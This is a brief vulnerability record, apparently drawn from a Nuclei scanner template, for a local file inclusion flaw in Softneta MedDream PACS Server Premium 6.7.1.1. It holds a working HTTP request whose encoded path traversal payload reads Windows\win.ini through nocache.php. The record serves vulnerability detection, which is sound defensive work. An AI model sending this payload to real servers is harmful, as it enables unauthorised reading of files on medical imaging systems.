# Vulnerability: Softneta MedDream PACS Server Premium 6.7.1.1 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`sofneta-mecdream-pacs-lfi.yaml`)

## Description
Softneta MedDream PACS Server Premium 6.7.1.1 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
```

